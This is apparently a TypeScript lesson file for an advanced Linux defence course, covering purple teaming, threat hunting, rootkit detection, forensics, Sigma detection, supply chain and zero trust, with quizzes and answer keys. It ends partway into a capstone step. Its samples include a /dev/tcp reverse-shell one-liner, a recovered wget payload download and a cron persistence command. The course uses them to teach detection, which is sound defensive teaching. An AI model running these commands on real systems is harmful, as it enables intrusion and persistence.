import type { Level } from '../types'

const level: Level = {
  id: 'pro',
  title: 'The deep end: hunting, forensics and detection engineering',
  summary:
    'How defence really works at the top: assume-breach and purple teaming, hypothesis-driven threat hunting, userland and kernel rootkits and how to catch them, memory and timeline forensics, Sigma-based detection engineering, supply-chain integrity, zero trust, and measuring a program that improves.',
  outcomes: [
    'Operate assume-breach and run purple-team exercises',
    'Hunt threats from hypotheses, not just alerts',
    'Understand LD_PRELOAD and kernel-module rootkits, and detect them',
    'Perform memory and super-timeline forensics',
    'Engineer portable detections with Sigma and the Pyramid of Pain',
    'Secure the supply chain, apply zero trust, and measure the program',
  ],
  steps: [
    {
      id: 'blin-p-01',
      title: 'Assume breach, and purple teaming',
      read: `The professional posture is **assume breach**: stop asking only "how do we keep them out?" and also ask "they are already in — how fast do we notice, and how much can they do before we stop them?" Prevention will eventually fail; the program is judged on detection and response.

## Red, blue, purple

- **Red team** emulates a real adversary to test the whole organisation — people, process, technology — end to end, usually quietly.
- **Blue team** defends and detects.
- **Purple team** is the collaboration: red executes specific techniques *with the blue team watching*, and together they answer "did we detect this? if not, why, and how do we fix it?"

Purple teaming is the fastest way to improve detection because it is a tight feedback loop: run a technique, check the telemetry, build or fix the detection, run it again until it fires reliably.

## Adversary emulation

Rather than "try to break in however", mature testing **emulates a specific adversary's known TTPs** (from threat intel and ATT&CK) using tools like **Atomic Red Team** (small, precise tests per technique) or **Caldera** (automated chains). You test the techniques that actually threaten you, and you measure coverage against ATT&CK: which techniques would you catch, which are blind spots?

## The deliverable

Pro defence produces an **ATT&CK coverage map**: for each relevant technique, do we prevent it, detect it, or are we blind? Purple-team exercises fill that map with evidence, and the blind spots become the detection backlog. This turns "are we secure?" into a concrete, prioritised, measurable plan.`,
      sample: {
        lang: 'bash',
        caption: 'Emulating one ATT&CK technique, then checking if it was seen',
        code: `# Atomic Red Team: T1053.003 - cron persistence
echo '* * * * * root /tmp/.bd.sh' | sudo tee -a /etc/cron.d/atomic

# blue side: did any control notice within minutes?
sudo ausearch -k priv -ts recent | grep cron.d
# ...and did the SIEM alert fire? if not -> detection backlog item`,
        output: `type=PATH name="/etc/cron.d/atomic" nametype=CREATE
# auditd SAW it (good). SIEM alert: MISSING.
# Purple-team finding: telemetry exists, detection rule does not.
# Action: write the Sigma rule, re-run, confirm it fires.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What makes purple teaming a faster way to improve detection than a traditional red-team engagement alone?',
        options: [
          'It uses more attackers',
          'Red executes techniques while blue watches the telemetry together, giving an immediate feedback loop — detect it, and if not, find out why and fix the detection then re-test — instead of a one-off report weeks later',
          'It replaces the need for detections',
          'It only tests physical security',
        ],
        answer: 1,
        explain:
          'A classic red team ends in a report; gaps are found once. Purple teaming runs each technique with both sides collaborating, so a missed detection is diagnosed and fixed on the spot and re-validated. That build-measure-fix loop, mapped to ATT&CK, systematically closes blind spots far faster than annual tests.',
        hint: 'What is different about red and blue working together in real time versus a report at the end?',
      },
    },

    {
      id: 'blin-p-02',
      title: 'Threat hunting from hypotheses',
      read: `Alerts catch what you already wrote a rule for. **Threat hunting** proactively looks for the attacker your rules would miss — starting not from an alert but from a **hypothesis**.

## The method

1. **Hypothesis** — an informed guess grounded in TTPs: "if an attacker has a foothold here, they would likely use SSH keys for persistence" or "cryptominers on our fleet would show as long-lived high-CPU processes from unusual paths."
2. **Gather** — pull the relevant telemetry across the fleet (process lists, auth logs, network flows, EDR data).
3. **Analyse** — look for the pattern the hypothesis predicts. Aggregation and *stacking* (see below) are your friends.
4. **Conclude** — you either find evil (→ incident), or you gain confidence the technique is absent *and* you learn whether you even had the data to see it.
5. **Operationalise** — a successful hunt that found something becomes a new automated detection so you never hunt for that manually again.

## Stacking / frequency analysis

The core hunting technique: aggregate an attribute across many hosts and look at the **rare** values. If 500 hosts run \`sshd\` from \`/usr/sbin/sshd\` and one runs it from \`/tmp/sshd\`, the outlier is the lead. Long tails — the things that appear once — are where evil hides, because attacker artefacts are, by definition, uncommon.

## Why pros hunt

Dwell time — how long an attacker sits undetected — is often measured in weeks or months. Hunting is how you find the intrusions your alerting missed and shorten that window. And every hunt, found something or not, tells you where your visibility has holes, which is itself a finding.`,
      sample: {
        lang: 'bash',
        caption: 'Stacking: the same binary across the fleet, rarest last',
        code: `# collect the path each host runs sshd from, then stack:
cat fleet-sshd-paths.txt | sort | uniq -c | sort -rn`,
        output: `    498 /usr/sbin/sshd
      1 /tmp/sshd          <- ONE host, unusual path: hunt lead
      1 /usr/local/sbin/sshd
# The count of 1 is the whole point. Investigate /tmp/sshd:
# a trojaned SSH daemon is a textbook credential-stealing backdoor.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'In threat hunting, why is "stacking" an attribute across many hosts and examining the rarest values so effective?',
        options: [
          'Common values are always malicious',
          'Attacker artefacts are uncommon by nature, so aggregating a value across the fleet makes the rare outliers — the single host doing something the other 499 do not — stand out as high-value leads',
          'It reduces the amount of data to collect',
          'Rare values are always false positives',
        ],
        answer: 1,
        explain:
          'Legitimate configuration is uniform; intrusions are anomalies. Counting occurrences of an attribute (a binary path, a parent process, a scheduled task) across the environment surfaces the long tail — the values that occur once or twice — which is exactly where malicious, non-standard artefacts live. Frequency analysis converts "look for evil" into "look at the outliers".',
        hint: 'If most hosts are identical, where would an attacker\'s change show up in the counts?',
      },
    },

    {
      id: 'blin-p-03',
      title: 'Userland rootkits: LD_PRELOAD',
      read: `A **rootkit** hides an attacker's presence — processes, files, connections — from the tools you use to look. The most accessible kind on Linux is the **LD_PRELOAD userland rootkit**, and understanding it teaches you why you cannot fully trust a compromised host's own tools.

## How it works

Dynamically linked programs resolve functions like \`readdir\` (used by \`ls\`), \`open\`, and \`fopen\` at runtime from shared libraries. The \`LD_PRELOAD\` environment variable (or the \`/etc/ld.so.preload\` file, which is system-wide) forces a chosen library to load **first**, so its version of \`readdir\` runs instead of the real one.

A malicious preload library can, for example, make \`readdir\` **skip any filename containing a magic string** — so \`ls\`, \`find\`, even \`ps\` (which reads \`/proc\`) no longer show the attacker's files and processes. The tools are honest; the library under them lies.

## Detecting it

- **Check \`/etc/ld.so.preload\`** — it should almost always be empty. A path here is a huge red flag.
- **Compare tools that use different code paths** — a statically linked \`busybox ls\`, or reading \`/proc\` directly, bypasses the hooked libc. If \`ls\` and a static tool disagree about what is in a directory, something is hooking libc.
- **From outside** — mount the disk read-only on a clean host; the rootkit's live hooks are not running, so the hidden files reappear.

## The lesson

On a host you suspect is rootkitted, **its own tools cannot be trusted** — they may be lying by design. Serious investigation uses known-good static binaries, off-host analysis, and cross-checks. This is why responders bring their own trusted toolkit and why memory/disk forensics from outside the box are so valuable.`,
      sample: {
        lang: 'bash',
        caption: 'The tell-tale preload, and a cross-check that exposes the lie',
        code: `cat /etc/ld.so.preload
echo "--- libc ls vs static busybox ls ---"
ls /tmp | wc -l
busybox ls /tmp | wc -l`,
        output: `/usr/lib/libhide.so         <- should be EMPTY; a preload rootkit
--- libc ls vs static busybox ls ---
4        <- hooked ls hides the attacker's files
7        <- static busybox sees all 7: 3 files are hidden`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'On a suspect host, `ls /tmp` shows 4 files but a statically linked `busybox ls /tmp` shows 7. What does the discrepancy indicate?',
        options: [
          'busybox is buggy',
          'A userland rootkit is hooking libc functions (via LD_PRELOAD or /etc/ld.so.preload) to hide files from dynamically linked tools like ls; the static busybox bypasses the hooked libc and sees the truth',
          'The extra files are temporary and vanished',
          'The two tools count differently by design',
        ],
        answer: 1,
        explain:
          'Dynamically linked `ls` calls the hooked `readdir` and is fed a filtered list; statically linked `busybox` does not use the system libc, so it is not hooked and reports all seven. Disagreement between a normal and a static tool is a classic rootkit indicator — and the reason you cannot trust a compromised host\'s own binaries.',
        hint: 'One tool uses the (compromised) system libc; the other does not. Which one is being lied to?',
      },
    },

    {
      id: 'blin-p-04',
      title: 'Kernel rootkits and their detection',
      read: `Deeper and nastier than userland rootkits are **kernel rootkits**, usually **Loadable Kernel Modules (LKMs)**. Running inside the kernel, they can hide processes, files, ports and even themselves from *everything* in userspace, because they subvert the layer all your tools ultimately depend on.

## What they do

A kernel rootkit can hook syscalls or manipulate kernel data structures to:

- Remove its own process/module from the lists the kernel reports (so \`lsmod\` and \`ps\` do not show it).
- Hide files and network connections at the kernel level, defeating even static userland tools.
- Grant an attacker instant root on a magic signal.

Because it is *in* the kernel, the trust problem from the last step becomes total: nothing the running system tells you is reliable.

## Detection strategies

- **Cross-view / cross-layer comparison** — compare what the high level reports versus a lower level. Tools like \`rkhunter\`, \`chkrootkit\`, and \`unhide\` look for processes that exist (a PID answers) but are absent from \`ps\`, or ports that are open but hidden from \`ss\`.
- **Memory forensics** (next step) — analyse a memory image *offline*, where the rootkit's live hooks are not defending themselves, and reconstruct the true process/module lists from raw kernel structures.
- **Kernel integrity from the start** — this is why the earlier controls matter: **Secure Boot** and **module signing** (only signed modules load), \`kernel.modules_disabled=1\` after boot, and IMA/EVM. If a rootkit cannot load, you never have to hunt it. Auditing module loads (the auditd \`modules\` key) makes the attempt noisy.

## The takeaway

Against a kernel rootkit, the only fully trustworthy analysis is **from outside the running kernel** — a memory image or an offline disk examined on a clean system. Prevention (signed modules, Secure Boot, locked-down module loading) is far cheaper than detection, which is why hardening the kernel's integrity is a pro priority.`,
      sample: {
        lang: 'bash',
        caption: 'Cross-view detection: a process the kernel runs but hides',
        code: `sudo unhide proc 2>/dev/null
echo "--- prevention: require signed modules ---"
cat /proc/sys/kernel/modules_disabled
mokutil --sb-state`,
        output: `Found HIDDEN PID: 3117
  cmdline: /tmp/.k/miner
  ps DID NOT list it, but /proc/3117 responds -> hidden process
--- prevention ---
1                       <- modules can no longer be loaded (good)
SecureBoot enabled      <- unsigned kernel rootkit cannot load`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is the only fully trustworthy way to analyse a suspected kernel-rootkit infection to examine the system from *outside* the running kernel (a memory image or offline disk on a clean host)?',
        options: [
          'It is faster',
          'A kernel rootkit runs at the layer every userspace tool depends on and can lie to all of them, including static binaries — so any answer the live system gives may be falsified; only analysis outside that kernel, where its hooks are not actively defending, is reliable',
          'Live analysis is illegal',
          'Offline analysis needs no tools',
        ],
        answer: 1,
        explain:
          'A userland rootkit can be caught with a static tool, but a kernel rootkit subverts the kernel itself — the foundation under even static binaries — so it can hide from everything the running system reports. Taking a memory image or mounting the disk on a clean machine analyses the data where the rootkit\'s live self-defence is not operating, which is the only place you can trust the results.',
        hint: 'If the kernel itself is lying, can any program running on top of it give you the truth?',
      },
    },

    {
      id: 'blin-p-05',
      title: 'Memory forensics with Volatility',
      read: `RAM holds what disk does not: running processes (including fileless malware that never touched disk), decryption keys, network connections, injected code, and the true state a rootkit hides. **Memory forensics** analyses a RAM capture to reconstruct all of it — offline, where live hooks cannot interfere.

## The workflow

1. **Acquire** — capture memory with \`avml\`, LiME, or from a VM snapshot / hypervisor. Do this *before* powering off (the assume-breach reason to isolate rather than shut down).
2. **Analyse** — **Volatility 3** parses the raw image using knowledge of kernel structures, independent of the (possibly lying) OS.

## What the plugins reveal

- \`linux.pslist\` / \`linux.pstree\` — processes from the kernel's own task list; compare to \`linux.psscan\` (which finds process structures directly) to spot **hidden** processes a rootkit unlinked.
- \`linux.bash\` — recover the commands the attacker typed, straight from shell memory.
- \`linux.check_syscall\` / \`linux.check_modules\` — find **hooked syscalls** and hidden kernel modules: direct rootkit detection.
- \`linux.malfind\` — regions of memory that look like injected/executable code with no backing file (classic injection).
- Network and open-file plugins — the connections and files the live host may have hidden.

## Why it is decisive

Memory forensics is where hidden processes become visible, fileless malware is caught, rootkit hooks are proven, and the attacker's actual keystrokes are recovered. It is the ground truth that a compromised, self-defending live system cannot give you — the reason capturing RAM is a first-hour priority.`,
      sample: {
        lang: 'bash',
        caption: 'Finding a rootkit-hidden process by comparing two views of memory',
        code: `# processes from the kernel task list vs. a raw scan of memory
vol -f mem.lime linux.pslist.PsList  | awk '{print $3}' | sort > list.txt
vol -f mem.lime linux.psscan.PsScan  | awk '{print $3}' | sort > scan.txt
comm -13 list.txt scan.txt   # in scan but NOT in pslist = hidden`,
        output: `miner          <- appears in psscan (memory scan) but was
               unlinked from pslist: a hidden process,
               exactly what a kernel rootkit does.
# vol linux.bash also recovered:  wget http://203.0.113.9/x -O /tmp/.k/miner`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A process appears in Volatility\'s `psscan` (which finds process structures directly in memory) but not in `pslist` (which follows the kernel\'s task list). What does that gap indicate?',
        options: [
          'A normal short-lived process',
          'A hidden process: something unlinked it from the kernel\'s task list so `ps`/`pslist` do not show it, while `psscan` still finds the leftover structure in memory — a hallmark of a rootkit',
          'Volatility misread the image',
          'The process has exited cleanly',
        ],
        answer: 1,
        explain:
          'Rootkits hide processes by unlinking their task_struct from the list the kernel reports (what `ps` and `pslist` walk). `psscan` ignores that list and carves process structures out of raw memory, so it still finds the hidden one. The discrepancy between "follow the list" and "scan memory directly" is a direct, powerful rootkit indicator that the live system cannot show you.',
        hint: 'One method trusts the kernel\'s list; the other searches memory directly. What kind of process would show up only in the second?',
      },
    },

    {
      id: 'blin-p-06',
      title: 'Timeline forensics: reconstructing the story',
      read: `An investigation must answer *what happened, in what order*. Every artefact on a system carries timestamps — file modify/access/change/birth (MACB) times, log entries, shell histories, browser data, journal entries. **Super-timeline** forensics gathers them all into one chronological narrative.

## plaso / log2timeline

The **plaso** toolkit (\`log2timeline.py\` then \`psort.py\`) extracts timestamps from dozens of artefact types across a disk image and merges them into a single sorted timeline. Suddenly you can read the intrusion as a story: at 14:22 a phishing doc opened, at 14:23 a script wrote to \`/tmp\`, at 14:24 an outbound connection to an IP, at 14:25 a new cron job — cause and effect, in order.

## Pivoting around a known time

The power move: anchor on one known event (an alert time, a suspicious file's mtime) and look at **everything that happened in the surrounding minutes**. Attacker actions cluster in time, so the neighbours of one artefact reveal the rest of the operation.

## Anti-forensics and how to see through it

Attackers **timestomp** — set a malicious file's timestamps to look old/normal. But there are usually multiple timestamps (MACB) and multiple sources (the filesystem journal, logs, the \`$I30\`/inode records), and they are hard to fake *consistently*. When a file's modify time is months ago but its inode-change time is today, or the filesystem journal disagrees with the reported mtime, that inconsistency itself is evidence of tampering — and of importance.

## Why pros build timelines

A pile of suspicious artefacts is confusing; the same artefacts in time order tell you the entry point, the sequence, the scope, and the dwell time. The timeline is the backbone of the incident report and of the "how did they get in, and what did they touch?" answers the organisation actually needs.`,
      sample: {
        lang: 'bash',
        caption: 'Building a super-timeline and reading the intrusion in order',
        code: `log2timeline.py --storage-file case.plaso disk.img
psort.py -o l2tcsv case.plaso "date > '2024-06-03 14:00:00'" \\
  | head -8`,
        output: `14:22:03  FILE    /home/u/invoice.docm  (opened)
14:22:31  FILE    /tmp/.s/stage.sh      (created)  <- dropped
14:22:35  LOG     auth.log  sudo: u : COMMAND=/bin/bash
14:22:40  NET     conn to 203.0.113.9:443          <- C2
14:23:02  FILE    /etc/cron.d/.sync     (created)  <- persistence
# entry -> execution -> C2 -> persistence, in 60 seconds.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'An attacker "timestomps" a malicious file so its modify time reads as months old. How can timeline forensics still expose it?',
        options: [
          'Timestomping is impossible',
          'Files carry multiple timestamps (MACB) recorded in multiple places (filesystem metadata, journal, logs); faking them all consistently is hard, so inconsistencies — e.g. an old modify time but a today inode-change time — reveal the tampering and flag the file as important',
          'The file deletes itself',
          'Only the newest timestamp is ever used',
        ],
        answer: 1,
        explain:
          'Timestomping usually alters the obvious modify/access times but not every timestamp or every source. The change (ctime) time, the filesystem journal, and log correlations often disagree with the faked values. A super-timeline surfaces those contradictions, and the inconsistency is itself strong evidence — both that the file was tampered with and that it matters to the case.',
        hint: 'How many timestamps does a file really have, and how many independent places record them?',
      },
    },

    {
      id: 'blin-p-07',
      title: 'Detection engineering with Sigma',
      read: `Detections written in one SIEM's query language are trapped there. **Sigma** is "the YARA of logs" — a vendor-neutral YAML format for detection rules that converts to Splunk, Elastic, Sentinel, and more. Detection engineering is the discipline of building, testing and maintaining these rules as code.

## A Sigma rule

A rule names a log source and the conditions that indicate the behaviour, plus metadata: an ATT&CK technique, a severity, and known false positives. Written once, it compiles to whatever backend you run.

## The Pyramid of Pain

David Bianco's model ranks indicators by how much **pain** it causes the attacker when you detect on them:

- **Hash values** — trivial for the attacker to change (recompile). Least pain.
- **IP addresses** — easy to change.
- **Domain names** — a bit harder.
- **Network/host artefacts** — annoying.
- **Tools** — painful; they must re-tool.
- **TTPs** — *maximum pain*: detecting *behaviour* forces the attacker to change how they operate, which is expensive and rare.

The lesson: invest detection effort near the top. A rule for "credential dumping behaviour" outlives a thousand hash rules.

## Detections are code

Treat rules like software: version control, peer review, test against known-good and known-bad data, and **tune** relentlessly. An untuned rule that fires 200 times a day trains analysts to ignore it — a noisy detection is worse than none, because it buries the real one. Track each rule's true/false-positive rate and prune or fix the noisy ones. The goal is high-signal detections mapped to ATT&CK, portable across tooling, and maintained like the critical code they are.`,
      sample: {
        lang: 'text',
        caption: 'A Sigma rule: high in the Pyramid of Pain (behaviour, not a hash)',
        code: `title: Service Account Spawned Interactive Shell
status: stable
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: 'SYSCALL'
    exe|endswith: ['/bash', '/sh', '/dash']
    auid: ['www-data', 'postgres', 'nginx']
  condition: selection
falsepositives:
  - Emergency manual maintenance (should be rare, ticketed)
level: high
tags: [attack.t1059, attack.execution]`,
        output: `# compile to your SIEM, e.g.:
#   sigma convert -t splunk service_shell.yml
# One portable rule -> Splunk, Elastic, Sentinel queries.
# It targets a TTP (behaviour) -> top of the Pyramid of Pain.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'According to the Pyramid of Pain, why should detection engineers prioritise rules based on TTPs (behaviours) over rules based on file hashes and IP addresses?',
        options: [
          'Hashes are hard to compute',
          'Detecting on hashes/IPs causes little pain — the attacker changes them cheaply — while detecting on behaviour (how they persist, escalate, move) forces them to change their whole way of operating, which is expensive and rare, so behavioural detections stay effective far longer',
          'IP addresses are always spoofed',
          'TTP rules are simpler to write',
        ],
        answer: 1,
        explain:
          'The pyramid ranks indicators by the cost your detection imposes on the adversary. A hash or IP is swapped in seconds; a technique is baked into their tooling and tradecraft. Detections at the top (TTPs) survive re-tooling and infrastructure changes, so a limited detection budget buys the most durable coverage when aimed there.',
        hint: 'Which detection forces the attacker to change their entire method rather than one artefact?',
      },
    },

    {
      id: 'blin-p-08',
      title: 'Living off the land on Linux',
      read: `Modern attackers avoid dropping malware that antivirus would catch. Instead they **live off the land (LOTL)**: they abuse the legitimate, trusted binaries already on the system to do their work. Detecting this is subtle, because every tool involved is supposed to be there.

## Linux LOLBins

Trusted binaries with a dual use an attacker exploits (catalogued at **GTFOBins**):

- \`curl\`/\`wget\` — download the next stage.
- \`bash\`/\`nc\`/\`socat\`/\`/dev/tcp\` — a reverse shell with no extra tools.
- \`python\`/\`perl\` — run arbitrary code, spawn shells, open sockets.
- \`tar\`/\`zip\`/\`dd\` — stage and exfiltrate data.
- \`find\`, \`awk\`, \`vim\`, \`gdb\` — execute commands, often abused when SUID or in a sudo rule.
- \`base64\` — decode an obfuscated payload.

## Why signature detection fails here

There is no malicious file to hash. \`bash\` running is not suspicious; \`bash\` on a web server opening a socket to an external IP and reading \`/dev/tcp\` is. The signal is in the **context and behaviour**, not the binary.

## Detecting LOTL

- **Process ancestry** — \`nginx\` → \`bash\` → \`curl\` is a chain that should never happen. Parent-child relationships are gold.
- **Unusual invocations** — \`bash -i >& /dev/tcp/1.2.3.4/443 0>&1\` is a reverse-shell fingerprint; base64-piped-to-bash is obfuscated execution.
- **Behaviour for the context** — a database process making outbound connections; a service account running an interpreter; any use of \`/dev/tcp\`.
- **Baselines** — know what each host/service *normally* executes, so an out-of-baseline invocation of a legitimate tool stands out.

This is why the earlier controls (execve auditing, eBPF/Falco, process-ancestry-aware rules) matter so much: against LOTL, watching *how legitimate tools are used* is the only reliable detection.`,
      sample: {
        lang: 'bash',
        caption: 'The behaviour, not the binary: a reverse shell built from trusted tools',
        code: `# attacker's one-liner — every command is legitimate and pre-installed:
bash -i >& /dev/tcp/203.0.113.9/443 0>&1

# detection is in the ancestry + the /dev/tcp usage, e.g. via auditd:
sudo ausearch -k exec -ts recent \\
  | grep -E 'nginx.*bash|/dev/tcp|-i.*tcp'`,
        output: `proctitle=bash -i
  ppid -> nginx     <- web server should NEVER be bash's parent
  a reference to /dev/tcp/203.0.113.9/443
# No malware file exists to detect. The chain and the
# /dev/tcp socket ARE the detection.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why do file-signature/antivirus detections struggle against "living off the land" attacks, and what detects them instead?',
        options: [
          'LOTL attacks are theoretical',
          'LOTL abuses legitimate, already-present binaries so there is no malicious file to signature; detection relies on behaviour and context instead — anomalous process ancestry (nginx spawning bash), unusual invocations (/dev/tcp reverse shells), and deviations from each host\'s normal execution baseline',
          'Antivirus catches them easily',
          'They only work on Windows',
        ],
        answer: 1,
        explain:
          'When the attacker uses `bash`, `curl` and `python` — tools that are supposed to be there — there is nothing to hash or blocklist. The maliciousness is in *how* and *where* they are used: a web server spawning a shell that opens `/dev/tcp` to an external host. So you detect on behaviour, process relationships, and departures from baseline, which is why rich execution telemetry (auditd/eBPF) and ancestry-aware rules are essential.',
        hint: 'If the binary is legitimate and there is no file to scan, what is left to detect on?',
      },
    },

    {
      id: 'blin-p-09',
      title: 'Supply-chain security',
      read: `You can harden your host perfectly and still be compromised through what you *install*: a backdoored dependency, a poisoned build step, a tampered package. Supply-chain attacks (SolarWinds, event-stream, the xz backdoor, countless malicious npm/PyPI packages) target the trust you place in your software's origins.

## The attack surface

- **Dependencies** — a library you pull in, or one *it* pulls in, is malicious or compromised. Typosquats (\`python-dateutil\` vs \`python-dateuti\`), hijacked maintainer accounts, or a legitimate package that turns malicious in a later version.
- **Build pipeline** — the CI/CD system that builds and signs your software is a high-value target; compromise it and you ship the backdoor to every customer, signed and trusted.
- **Base images / packages** — a tampered container base image or a compromised package mirror.

## The defences

- **Know what you ship** — a **Software Bill of Materials (SBOM)** lists every component and version, so when a bad version is announced you can answer "are we affected?" in minutes, not weeks.
- **Pin and verify** — lockfiles with hashes so you get *exactly* the reviewed version; verify signatures (Sigstore/cosign) so you know the artefact came from who you think.
- **Scan continuously** — dependency scanners (Trivy, Grype, \`npm audit\`, Dependabot) against vulnerability databases; alert on known-bad versions.
- **Harden the pipeline** — least privilege for CI, protected branches, reproducible builds, and provenance attestations (SLSA framework) so you can prove *how* an artefact was built.

## The mindset

Trust in software is transitive and must be earned, not assumed. A pro treats every dependency and every build step as part of the attack surface, maintains an SBOM so incident response is fast, verifies provenance, and hardens the pipeline as carefully as the production hosts — because a compromise there ships to everyone at once.`,
      sample: {
        lang: 'bash',
        caption: 'An SBOM turning a disclosure into a two-minute answer',
        code: `# generate an SBOM for an image, then answer "are we affected?"
syft myapp:1.4 -o spdx-json > sbom.json

# CVE announced in liblzma 5.6.0/5.6.1 (the xz backdoor). Are we?
grep -A2 '"name": "liblzma"' sbom.json | grep version`,
        output: `"version": "5.4.5"    <- NOT the backdoored 5.6.0/5.6.1: safe.
# Without an SBOM this is a frantic fleet-wide hunt.
# With one, it is a grep. That speed IS the control.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A serious vulnerability is announced in a specific version of a widely used library. How does maintaining a Software Bill of Materials (SBOM) change your response?',
        options: [
          'It patches the library automatically',
          'The SBOM lists every component and version you ship, so you can immediately determine which of your systems include the affected version and version — turning "are we affected?" from a slow, error-prone hunt into a fast, definitive query',
          'It prevents the vulnerability from existing',
          'It only matters for open-source software',
        ],
        answer: 1,
        explain:
          'An SBOM is an inventory of your software\'s ingredients. When a bad version is disclosed, the critical question is "where do we run it?" Without an inventory that is a scramble across every app and image; with an SBOM it is a lookup. Fast, accurate exposure assessment is exactly what determines whether you patch the affected systems before attackers reach them.',
        hint: 'What question does an ingredient list let you answer instantly when one ingredient is recalled?',
      },
    },

    {
      id: 'blin-p-10',
      title: 'Zero trust architecture',
      read: `The old model was a hard perimeter and a soft, trusted interior: get past the firewall and you were "inside", implicitly trusted. Attackers love that — one foothold and they roam freely (lateral movement). **Zero trust** discards implicit trust entirely: *never trust, always verify*, for every request, regardless of where it comes from.

## The core principles (NIST 800-207)

- **Verify explicitly** — authenticate and authorise every request based on identity, device health, and context, every time. Being "on the network" grants nothing.
- **Least-privilege access** — grant the minimum needed, ideally just-in-time and just-enough, and re-evaluate continuously.
- **Assume breach** — design as if the attacker is already inside: segment everything so a compromise is contained, and inspect and log all traffic, including internal.

## What it looks like in practice

- **Micro-segmentation** — internal traffic is not open; each service can talk only to the specific services it needs (identity-based policy, not a flat network). Lateral movement dies here.
- **Strong identity everywhere** — MFA for users, mTLS and workload identity for services. Every actor, human or machine, proves who it is.
- **Device posture** — access can require a healthy, compliant device, not just correct credentials.
- **Continuous evaluation** — trust is not granted once at login; it is re-checked, and revoked when signals change.

## Why it is the pro direction

Perimeter defence fails the moment one thing inside is compromised — which, under assume-breach, is inevitable. Zero trust limits the blast radius: a stolen credential or a popped host reaches only what that specific identity is explicitly allowed, and every attempt is verified and logged. It is the architectural expression of least privilege and assume-breach applied to the *whole* environment, and it directly attacks the lateral movement that turns a single foothold into a full compromise.`,
      sample: {
        lang: 'text',
        caption: 'Flat network vs. zero trust: what one compromised host can reach',
        code: `PERIMETER MODEL (flat internal network):
  attacker pops web01  ->  can reach db, files, admin, everything
  one foothold = free lateral movement across the "trusted" inside

ZERO TRUST (micro-segmented, identity-based policy):
  attacker pops web01
   -> web01's identity may ONLY talk to the app API on :8443
   -> db refuses web01 (no policy allows it), and logs the attempt
   -> lateral movement blocked; blast radius = web01 alone`,
        output: `The stolen foothold reaches only what web01 was explicitly
authorized for. Every other hop is denied and alerted.
Assume-breach + least privilege, enforced network-wide.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'How does a zero-trust architecture limit the damage of a single compromised internal host compared with a traditional hard-perimeter network?',
        options: [
          'It makes the perimeter firewall stronger',
          'By removing implicit "inside" trust and enforcing per-request, identity-based, least-privilege access with micro-segmentation, a compromised host can reach only the specific services its identity is explicitly allowed — so lateral movement is blocked and the blast radius is contained, instead of one foothold granting free run of a trusted interior',
          'It prevents any host from ever being compromised',
          'It only protects the network edge',
        ],
        answer: 1,
        explain:
          'A flat, trusted interior means one foothold reaches everything. Zero trust verifies every request explicitly and grants least privilege, so segmentation and identity policy confine a popped host to exactly what it was authorised for. The stolen credential or compromised machine cannot pivot to the database or admin plane because nothing implicitly trusts it — attacking the lateral movement that turns small compromises into large ones.',
        hint: 'Under assume-breach, what matters most: keeping everyone out, or limiting where a compromised insider can go?',
      },
    },

    {
      id: 'blin-p-11',
      title: 'Measuring a defensive program',
      read: `At the top, defence is managed like any critical function: with metrics that show whether it is working and improving, and that justify investment. Opinions ("we feel secure") do not survive an incident; measurements do.

## The metrics that matter

- **MTTD — Mean Time To Detect.** From the attacker's first action to your detection. The single most important number: it *is* dwell time, and dwell time is how much damage they can do. Driving MTTD down is the core goal of detection engineering and hunting.
- **MTTR — Mean Time To Respond/Remediate.** From detection to containment/eradication. Fast, practised response shrinks impact even when detection is late.
- **Detection coverage** — the ATT&CK map: what fraction of relevant techniques you can detect, and where the blind spots are. Purple teaming fills this in with evidence.
- **Patch/vulnerability metrics** — time to patch critical vulns, percentage of fleet compliant with the baseline (OpenSCAP scores over time).
- **Alert quality** — true-positive rate, false-positive rate, alert volume per analyst. A SOC drowning in false positives has a metric problem before it has a detection problem.

## Using them

Metrics drive decisions: a high MTTD for a technique class points your next detection work; a low baseline-compliance score points your hardening automation; a rising false-positive rate says tune before you add rules. Track them over time — the trend matters more than any single value — and tie them to the ATT&CK coverage map so investment goes to the biggest real gaps.

## The pro perspective

You cannot improve what you do not measure, and you cannot defend a budget without evidence. A mature program can state its MTTD/MTTR trends, its ATT&CK coverage, and its baseline compliance, and can show each getting better because of specific work. That is the difference between security as a vibe and security as an engineered, accountable capability.`,
      sample: {
        lang: 'text',
        caption: 'A program dashboard: trends, not vibes',
        code: `Metric                     Q1      Q2      Q3     Goal
------------------------------------------------------------
MTTD (dwell time)          9 days  40 hrs  6 hrs  < 24h  ✓
MTTR (detect->contain)     3 days  1 day   4 hrs  < 8h   ✓
ATT&CK technique coverage  22%     51%     68%    > 80%
Baseline compliance (CIS)  74%     88%     96%    > 95%  ✓
Alert false-positive rate  61%     30%     12%    < 15%  ✓`,
        output: `Each number ties to work done: purple-team exercises raised
coverage; detection tuning cut false positives; automation
lifted CIS compliance. The trend proves the program works
and shows exactly where to invest next (coverage: 68 -> 80).`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is Mean Time To Detect (MTTD) often called the single most important metric for a defensive program?',
        options: [
          'It measures how fast the network runs',
          'MTTD is effectively the attacker\'s dwell time — how long they operate undetected — and that window directly determines how much they can steal, spread and damage, so reducing it is the core payoff of detection engineering and hunting',
          'It counts the number of firewalls',
          'It only matters after an incident is over',
        ],
        answer: 1,
        explain:
          'Prevention will sometimes fail (assume breach), so the question becomes how quickly you notice. MTTD is that time-to-notice, which equals dwell time — and dwell time bounds the harm: a threat caught in hours does far less than one that lives for months. That is why hunting and detection work are aimed squarely at driving MTTD down, and why it headlines the program metrics.',
        hint: 'What does the time between the attacker\'s first move and your detection let them do?',
      },
    },

    {
      id: 'blin-p-12',
      title: 'Capstone: run a purple-team exercise end to end',
      read: `Tie the whole track together into the exercise a senior defender leads: take one realistic attack chain, run it against your own environment, measure what you caught, and close the gaps — producing evidence that your defence improved.

## The exercise, end to end

